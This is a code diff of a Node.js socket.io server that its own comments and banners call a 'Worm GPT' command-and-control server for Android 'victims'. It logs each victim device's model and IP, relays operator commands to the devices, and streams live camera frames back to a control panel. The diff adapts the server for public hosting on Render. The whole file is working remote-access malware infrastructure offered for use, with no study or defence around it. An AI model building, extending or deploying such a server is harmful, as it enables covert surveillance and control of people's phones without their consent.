@@ -2,61 +2,64 @@ const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http, {
-    cors: { origin: "*" },
-    maxHttpBufferSize: 1e8 // لضمان استقبال ملفات الفيديو والصور الكبيرة دون انقطاع
+    cors: {
+        origin: "*", // للسماح بلوحة التحكم بالاتصال من أي مكان
+        methods: ["GET", "POST"]
+    },
+    maxHttpBufferSize: 1e8 // مهم جداً لاستقبال بث الفيديو والصور العالية الدقة
 });
 
-// تخزين بيانات الأجهزة المتصلة
-let activeVictims = {};
+// ملفات لوحة التحكم (اختياري إذا أردت رفعها مع السيرفر)
+app.use(express.static('public'));
 
-// صفحة تأكيد عمل السيرفر
+// 1. استجابة ضرورية لمنصة Render (Health Check)
 app.get('/', (req, res) => {
-    res.send('<h1 style="color:red; background:black; height:100vh; display:flex; align-items:center; justify-content:center;">Worm GPT Server is Operational 😈</h1>');
+    res.status(200).send('C2 Server is Online and Secure 😈');
 });
+
+// تخزين الضحايا النشطين
+let victims = {};
 
 io.on('connection', (socket) => {
-    console.log('--- [!] اتصال جديد من بروتوكول غامض ---');
+    console.log('[!] اتصال جديد عبر النفق المشفر');
 
-    // 1. استقبال بيانات الضحية عند أول اتصال
+    // استقبال بيانات الضحية عند الربط الأول
     socket.on('victim_online', (data) => {
-        activeVictims[socket.id] = {
+        victims[socket.id] = {
             id: socket.id,
-            model: data.model || "Android Device",
+            model: data.model || "Unknown Android",
             ip: socket.handshake.address
         };
-        console.log(`[+] ضحية جديدة مرتبطة: ${activeVictims[socket.id].model}`);
-        
-        // إرسال تنبيه للوحة التحكم لتحديث قائمة الضحايا
-        io.emit('new_victim_alert', activeVictims[socket.id]);
+        console.log(`[+] تم إحكام السيطرة على: ${victims[socket.id].model}`);
+        io.emit('new_victim_alert', victims[socket.id]);
     });
 
-    // 2. تمرير الأوامر من لوحة التحكم إلى الضحية
+    // تمرير الأوامر من لوحة التحكم (Admin) إلى الضحية (Target)
     socket.on('admin_command', (payload) => {
-        console.log(`[→] أمر مرسل: ${payload.command}`);
-        // إرسال الأمر لكل الأجهزة المتصلة (أو جهاز محدد إذا أردت تطويره لاحقاً)
+        console.log(`[→] تنفيذ أمر: ${payload.command}`);
         socket.broadcast.emit(payload.command, payload);
     });
 
-    // 3. استقبال "فريمات" الفيديو والبث من الضحية وتمريرها للوحة التحكم
-    socket.on('video_frame', (base64Frame) => {
-        // إرسال الصورة فوراً للوحة التحكم ليتم عرضها كفيديو مباشر
-        socket.broadcast.emit('display_frame', { frame: base64Frame });
+    // استقبال ونقل بث الكاميرا (Video Frames)
+    socket.on('video_frame', (base64Data) => {
+        // نرسل البيانات فوراً للوحة التحكم
+        socket.broadcast.emit('display_frame', { frame: base64Data });
     });
 
-    // 4. معالجة انقطاع الاتصال
     socket.on('disconnect', () => {
-        if (activeVictims[socket.id]) {
-            console.log(`[-] فقدان السيطرة على: ${activeVictims[socket.id].model}`);
-            delete activeVictims[socket.id];
+        if (victims[socket.id]) {
+            console.log(`[-] الضحية ${victims[socket.id].model} خرجت عن السيطرة`);
+            delete victims[socket.id];
         }
     });
 });
 
-// تشغيل الخادم على المنفذ 8080
-const PORT = 8080;
+// 2. تعديل المنفذ (Port) ليتناسب مع Render
+// Render يمرر المنفذ عبر متغير البيئة process.env.PORT
+const PORT = process.env.PORT || 8080;
 http.listen(PORT, '0.0.0.0', () => {
-    console.log('\x1b[31m%s\x1b[0m', '#############################################');
-    console.log('\x1b[31m%s\x1b[0m', `   WORM GPT C2 SERVER STARTED ON PORT: ${PORT}  `);
-    console.log('\x1b[31m%s\x1b[0m', '   READY TO CAPTURE LIVE STREAMS... 😈       ');
-    console.log('\x1b[31m%s\x1b[0m', '#############################################');
+    console.log(`-------------------------------------------`);
+    console.log(`WORM GPT SERVER IS LIVE ON PORT: ${PORT}`);
+    console.log(`GLOBAL ACCESS ENABLED 😈`);
+    console.log(`-------------------------------------------`);
 });
